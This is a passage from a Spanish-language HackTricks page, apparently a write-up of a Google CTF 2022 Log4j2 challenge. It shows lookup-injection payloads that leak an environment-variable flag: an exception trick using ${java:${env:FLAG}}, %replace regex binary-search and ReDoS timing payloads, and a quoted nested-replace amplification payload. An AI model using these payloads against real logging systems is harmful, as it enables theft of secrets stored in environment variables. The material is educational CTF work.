> A partir de la versi√≥n 2.17.0 (y 2.12.3 y 2.3.1 para Java 7 y Java 6), **solo se expanden recursivamente las cadenas de b√∫squeda en la configuraci√≥n**; en cualquier otro uso, solo se resuelve la b√∫squeda de nivel superior y las b√∫squedas anidadas no se resuelven.

Esto significa que de forma predeterminada no se puede **utilizar ninguna explotaci√≥n de `jndi`**. Adem√°s, para realizar **b√∫squedas recursivas**, es necesario tenerlas configuradas.

Por ejemplo, en ese CTF esto estaba configurado en el archivo log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### B√∫squedas de entorno

En este CTF, el atacante controlaba el valor de `${sys:cmd}` y necesitaba extraer la bandera de una variable de entorno.\
Como se ve en esta p√°gina en [**cargas √∫tiles anteriores**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), hay diferentes formas de acceder a las variables de entorno, como: **`${env:FLAG}`**. En este CTF esto fue in√∫til, pero podr√≠a no serlo en otros escenarios de la vida real.

### Exfiltraci√≥n en excepciones

En el CTF, no se pod√≠a acceder al stderr de la aplicaci√≥n Java utilizando log4J, pero las excepciones de Log4J se env√≠an a stdout, que se imprime en la aplicaci√≥n Python. Esto significa que al desencadenar una excepci√≥n, pod√≠amos acceder al contenido. Una excepci√≥n para exfiltrar la bandera fue: **`${java:${env:FLAG}}`.** Esto funciona porque **`${java:CTF{blahblah}}`** no existe y se mostrar√° una excepci√≥n con el valor de la bandera:

![](<../../.gitbook/assets/image (157).png>)

### Excepciones de patrones de conversi√≥n

Solo para mencionarlo, tambi√©n se pod√≠a inyectar nuevos [**patrones de conversi√≥n**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) y desencadenar excepciones que se registrar√°n en `stdout`. Por ejemplo:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

Esto no result√≥ √∫til para exfiltrar datos dentro del mensaje de error, porque la b√∫squeda no se resolv√≠a antes del patr√≥n de conversi√≥n, pero podr√≠a ser √∫til para otras cosas como la detecci√≥n.

### Expresiones regulares de patrones de conversi√≥n

Sin embargo, es posible utilizar algunos **patrones de conversi√≥n que admiten expresiones regulares** para exfiltrar informaci√≥n de una b√∫squeda utilizando expresiones regulares y abusando de comportamientos de **b√∫squeda binaria** o **basados en el tiempo**.

* **B√∫squeda binaria a trav√©s de mensajes de excepci√≥n**

El patr√≥n de conversi√≥n **`%replace`** se puede utilizar para **reemplazar** **contenido** de una **cadena** incluso utilizando **expresiones regulares**. Funciona de la siguiente manera: `replace{pattern}{regex}{substitution}`\
\`\`Abusando de este comportamiento, podr√≠as hacer que el reemplazo **desencadene una excepci√≥n si la expresi√≥n regular coincide** con algo dentro de la cadena (y no se producir√° ninguna excepci√≥n si no se encuentra) de la siguiente manera:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Basado en el tiempo**

Como se mencion√≥ en la secci√≥n anterior, **`%replace`** admite **regexes**. Por lo tanto, es posible utilizar una carga √∫til de la p√°gina [**ReDoS**](../regular-expression-denial-of-service-redos.md) para causar un **tiempo de espera** en caso de que se encuentre la bandera.\
Por ejemplo, una carga √∫til como `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` provocar√≠a un **tiempo de espera** en ese CTF.

En este [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), en lugar de utilizar un ataque ReDoS, se utiliz√≥ un **ataque de amplificaci√≥n** para causar una diferencia de tiempo en la respuesta:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Si la bandera comienza con `flagGuess`, toda la bandera se reemplaza por 29 `#` (utilic√© este car√°cter porque probablemente no formar√≠a parte de la bandera). **Cada uno de los 29 `#` resultantes se reemplaza por 54 `#`**. Este proceso se repite **6 veces**, ¬°lo que da un total de ` 29*54*54^6* =`` `` `**`96816014208`  `#`!**
>
> Reemplazar tantos `#` provocar√° el tiempo de espera de 10 segundos de la aplicaci√≥n Flask, lo que a su vez resultar√° en el c√≥digo de estado HTTP 500 que se env√≠a al usuario. (Si la bandera no comienza con `flagGuess`, recibiremos un c√≥digo de estado no 500)

## Referencias

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que m√°s importan para que puedas solucionarlas m√°s r√°pido. Intruder rastrea tu superficie de ataque, realiza escaneos de amenazas proactivas, encuentra problemas en toda tu pila tecnol√≥gica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pru√©balo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
